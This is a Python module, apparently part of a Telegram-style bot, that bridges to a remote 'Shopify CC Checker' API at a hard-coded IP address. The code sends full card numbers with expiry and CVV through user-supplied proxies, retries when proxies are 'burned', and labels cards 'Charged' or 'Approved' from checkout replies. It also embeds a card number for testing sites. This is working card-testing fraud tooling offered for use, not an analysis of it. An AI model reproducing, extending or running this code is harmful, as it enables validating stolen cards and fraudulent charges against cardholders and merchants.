"""
checker_bridge.py — Shopify CC Checker API Bridge

New single-endpoint API: http://5.175.222.144:8081/
Request format: ?cc|mm|yy|cvv&proxy=host:port:user:pass
No site required. Uses raw TCP to prevent | → %7C encoding.
"""

import asyncio
import json
import time
import logging
from urllib.parse import quote as _urlquote

log = logging.getLogger("checker_bridge")
log.setLevel(logging.DEBUG)

# ── API endpoint ──────────────────────────────────────────────────────────────
API_BASE = "http://5.175.222.144:8081"
API_HOST = "5.175.222.144"
API_PORT = 8081

# ── Timeouts ──────────────────────────────────────────────────────────────────
_REQUEST_TIMEOUT = 120
_CONNECT_TIMEOUT = 5

# ── Retry config ──────────────────────────────────────────────────────────────
_MAX_RETRIES = 15
_RETRY_DELAY = 1.5

# ── aiohttp session (used only for /health pings) ─────────────────────────────
_session = None

async def _get_session():
    global _session
    if _session is None or _session.closed:
        import aiohttp
        conn = aiohttp.TCPConnector(
            limit=100,
            limit_per_host=50,
            ttl_dns_cache=300,
            keepalive_timeout=30,
            enable_cleanup_closed=True,
        )
        _session = aiohttp.ClientSession(
            connector=conn,
            timeout=aiohttp.ClientTimeout(total=30, connect=5),
            headers={"User-Agent": "checker-bridge/1.0"},
        )
    return _session


# ── Proxy formatter (host:port:user:pass) ─────────────────────────────────────

def _proxy_data_to_proxy_str(proxy_data: dict | None) -> str | None:
    if not proxy_data:
        return None
    # prefer fully-built proxy_url from proxy.json
    existing = proxy_data.get("proxy_url")
    if existing and isinstance(existing, str) and existing.strip():
        from urllib.parse import urlparse
        parsed = urlparse(existing.strip())
        host = parsed.hostname
        port = parsed.port
        user = parsed.username
        pw = parsed.password
        if host and port:
            if user and pw:
                return f"{host}:{port}:{user}:{pw}"
            return f"{host}:{port}"
    ip    = str(proxy_data.get("ip")   or "").strip()
    port  = str(proxy_data.get("port") or "").strip()
    user  = proxy_data.get("username")
    pw    = proxy_data.get("password")
    if not ip or not port:
        return None
    if user and pw:
        return f"{ip}:{port}:{user}:{pw}"
    return f"{ip}:{port}"


# ── CC formatter (4-digit year → 2-digit year) ────────────────────────────────

def _format_cc_for_api(cc_str: str) -> str:
    """Convert cc|mm|yyyy|cvv → cc|mm|yy|cvv for the API."""
    parts = cc_str.split("|")
    if len(parts) >= 3:
        year = parts[2].strip()
        if len(year) == 4:
            parts[2] = year[2:]  # 2037 → 37
    return "|".join(parts[:4])


# ── Error detection ───────────────────────────────────────────────────────────

_PROXY_BURNED_INDICATORS = (
    "proxy burned", "change your proxy", "proxy error",
    "authentication failed", "could not connect",
)

def _is_proxy_burned(text: str) -> bool:
    if not text:
        return False
    return any(ind in text.lower() for ind in _PROXY_BURNED_INDICATORS)


# ── Raw HTTP GET (bypasses aiohttp URL encoding) ──────────────────────────────

async def _raw_http_get(host: str, port: int, path: str, timeout: float) -> tuple[int, str]:
    """
    Open a raw TCP socket and send an HTTP/1.1 GET request.
    Returns (status_code, body_text). Guaranteed to send path bytes as-is.
    """
    reader, writer = await asyncio.wait_for(
        asyncio.open_connection(host, port),
        timeout=_CONNECT_TIMEOUT,
    )
    try:
        request = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}:{port}\r\n"
            f"User-Agent: checker-bridge/1.0\r\n"
            f"Accept: */*\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode("utf-8")

        writer.write(request)
        await asyncio.wait_for(writer.drain(), timeout=timeout)

        # Read until server closes connection (Connection: close)
        response_data = b""
        while True:
            try:
                chunk = await asyncio.wait_for(reader.read(8192), timeout=timeout)
                if not chunk:
                    break
                response_data += chunk
            except asyncio.TimeoutError:
                break

        if not response_data:
            raise RuntimeError("Empty response from API")

        header_end = response_data.find(b"\r\n\r\n")
        if header_end == -1:
            raise RuntimeError("Invalid HTTP response — no header terminator")

        headers = response_data[:header_end].decode("utf-8", errors="ignore")
        body = response_data[header_end + 4:].decode("utf-8", errors="ignore")

        status_line = headers.split("\r\n")[0]
        parts = status_line.split()
        if len(parts) < 2:
            raise RuntimeError(f"Invalid status line: {status_line}")

        return int(parts[1]), body

    finally:
        writer.close()
        try:
            await asyncio.wait_for(writer.wait_closed(), timeout=5)
        except Exception:
            pass


# ── API call with retry ───────────────────────────────────────────────────────

async def _call_api(cc_str: str, proxy_str: str) -> dict:
    """
    Call the Shopify checker API via raw TCP.
    Retries on network errors and 5xx. Limited retries on 4xx.
    """
    cc_norm = _format_cc_for_api(cc_str)
    path = f"/?{cc_norm}&proxy={proxy_str}"

    last_error = "Unknown error"

    for attempt in range(1, _MAX_RETRIES + 1):
        t0 = time.monotonic()
        cc4 = cc_norm.split("|")[0][-4:] if "|" in cc_norm else cc_norm[-4:]

        try:
            log.debug(
                f"[api] attempt {attempt}/{_MAX_RETRIES} | cc=...{cc4} | "
                f"proxy={proxy_str[:30]}..."
            )

            status, body = await _raw_http_get(
                API_HOST, API_PORT, path, timeout=_REQUEST_TIMEOUT
            )

            # Try JSON parse
            try:
                data = json.loads(body)
            except Exception:
                data = {"_raw_text": body}

            resp_text = str(
                data.get("response")
                or data.get("Response")
                or data.get("status")
                or data.get("message")
                or data.get("_raw_text")
                or ""
            )

            elapsed = (time.monotonic() - t0) * 1000

            # Proxy burned → immediate return, no retry
            if _is_proxy_burned(resp_text):
                log.warning(f"[api] proxy burned on attempt {attempt}")
                return data

            if status == 200:
                log.debug(
                    f"[api] ✓ attempt {attempt} | {elapsed:.0f}ms | "
                    f"resp={resp_text[:60]}"
                )
                return data

            # Non-200: log and decide whether to retry
            last_error = f"HTTP {status} | Body: {body[:300]}"
            log.warning(f"[api] error attempt {attempt} | {last_error}")

            # 4xx client errors: don't waste 15 retries, bail after 3
            if 400 <= status < 500 and attempt >= 3:
                raise RuntimeError(last_error)

        except (asyncio.TimeoutError, OSError, ConnectionError) as e:
            last_error = f"{type(e).__name__}: {e}"
            log.warning(f"[api] network error attempt {attempt} | {last_error}")
        except Exception as e:
            last_error = f"{type(e).__name__}: {e}"
            log.warning(f"[api] exception attempt {attempt} | {last_error}")

        if attempt < _MAX_RETRIES:
            await asyncio.sleep(_RETRY_DELAY)

    raise RuntimeError(f"API failed after {_MAX_RETRIES} attempts: {last_error}")


# ── Result normalisation ──────────────────────────────────────────────────────

def _map_result(raw: dict, cc_str: str, site_url: str) -> dict:
    response = raw.get("Response", raw.get("response", "Unknown"))
    price    = raw.get("Price",    raw.get("price",    "-"))
    gate     = raw.get("Gate",     raw.get("gate",     "Shopify"))

    rl = str(response).lower()
    if "order_placed" in rl or "order completed" in rl or "💎" in str(response):
        status = "Charged"
    elif any(k in rl for k in [
        "invalid_cvv", "incorrect_cvv", "insufficient_funds",
        "approved", "invalid_cvc", "incorrect_cvc",
        "incorrect_zip", "insufficient funds",
    ]):
        status = "Approved"
    else:
        status = response

    result = {
        "Response": response,
        "Price":    price,
        "Gate":     gate,
        "Status":   status,
        "CC":       raw.get("CC", cc_str),
        "Site":     raw.get("Site", site_url),
    }
    p = str(result["Price"])
    if p not in ("-", "", "0.00") and not p.startswith("$"):
        result["Price"] = f"${p}"
    return result


# ── Dead-response detection ───────────────────────────────────────────────────

_DEAD_INDICATORS = (
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'cloudflare', 'connection failed',
    'timed out', 'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'http error', 'timeout', 'unreachable',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'http 404', 'url rejected', 'malformed input',
    'amount_too_small', 'site dead', 'captcha_required', 'site errors',
    'all products sold out', 'no_session_token', 'tokenize_fail',
    'all nodes failed',
)

def _is_dead(response_text: str) -> bool:
    if not response_text:
        return True
    rl = response_text.lower()
    return any(ind in rl for ind in _DEAD_INDICATORS)


# ── Public API ────────────────────────────────────────────────────────────────

async def check_card_site(cc_str: str, site_url: str, proxy_data: dict | None) -> dict:
    """
    Main async entry point called by bot.py for every CC check.
    Uses raw TCP to ensure | is never URL-encoded.
    """
    _ensure_health_loop()

    proxy_str = _proxy_data_to_proxy_str(proxy_data)
    if not proxy_str:
        return {
            "Response": "No proxy – add one with /addpxy",
            "Price": "-", "Gate": "-", "Status": "No proxy",
            "CC": cc_str, "Site": site_url,
        }

    if site_url and not site_url.startswith("http"):
        site_url = f"https://{site_url}"
    site_url = (site_url or "").rstrip("/")

    t_start = time.monotonic()
    cc4 = cc_str.split('|')[0][-4:] if '|' in cc_str else cc_str[-4:]

    log.info(
        f"[bridge] check_card_site | cc=...{cc4} | "
        f"proxy={proxy_str[:25] if proxy_str else 'NONE'}..."
    )

    try:
        raw    = await _call_api(cc_str, proxy_str)
        result = _map_result(raw, cc_str, site_url)
        log.info(
            f"[bridge] done | {(time.monotonic()-t_start)*1000:.0f}ms"
            f" | status={result.get('Status')} | resp={result.get('Response','')[:60]}"
        )

        resp_l = str(result.get("Response", "")).lower()
        if _is_proxy_burned(resp_l):
            return {
                "Response": "Proxy burned - change your proxy",
                "Price": "-", "Gate": "Shopify", "Status": "Error",
                "CC": cc_str, "Site": site_url,
            }
        return result

    except Exception as e:
        err_str = str(e)[:200]
        log.error(f"[bridge] API error | {err_str}")

        if _is_proxy_burned(err_str):
            final_resp = "Proxy burned - change your proxy"
        else:
            final_resp = f"API Error: {err_str}"

        return {
            "Response": final_resp,
            "Price": "-", "Gate": "-", "Status": "Error",
            "CC": cc_str, "Site": site_url,
        }


async def test_site(
    site_url:   str,
    proxy_data: dict | None,
    test_card:  str = "4031630422575208|01|2030|280",
) -> dict:
    raw           = await check_card_site(test_card, site_url, proxy_data)
    response_text = raw.get("Response", "")
    price         = raw.get("Price", "-")
    status        = "working"
    if "proxy dead" in response_text.lower():
        status = "proxy_dead"
    elif _is_dead(response_text):
        status = "dead"
    return {"status": status, "response": response_text, "site": site_url, "price": price}


# ── Background health pinger ──────────────────────────────────────────────────

_HEALTH_PING_INTERVAL = 15
_health_task = None

async def _health_loop() -> None:
    while True:
        await asyncio.sleep(_HEALTH_PING_INTERVAL)
        try:
            sess = await _get_session()
            async with sess.get(
                f"{API_BASE}/health",
                timeout=aiohttp.ClientTimeout(total=6, connect=4),
            ) as r:
                if r.status == 200:
                    log.debug("[health] API is up")
        except Exception:
            pass

def _ensure_health_loop() -> None:
    global _health_task
    try:
        loop = asyncio.get_event_loop()
        if loop.is_running() and (_health_task is None or _health_task.done()):
            _health_task = loop.create_task(_health_loop())
    except Exception:
        pass


# ── /api management helpers (used by bot.py) ──────────────────────────────────

def get_all_nodes() -> list[str]:
    """Return the API endpoint (legacy compat)."""
    return [API_BASE]


async def check_node_health(node: str) -> bool:
    """Ping the API endpoint. Returns True if alive."""
    try:
        sess = await _get_session()
        async with sess.get(
            f"{API_BASE}/health",
            timeout=aiohttp.ClientTimeout(total=6, connect=4),
        ) as r:
            return r.status == 200
    except Exception:
        return False


def is_node_disabled(node: str) -> bool:
    return False


def disable_node(node: str) -> None:
    log.info(f"[api] node DISABLED: {node}")


def enable_node(node: str) -> None:
    log.info(f"[api] node ENABLED: {node}")
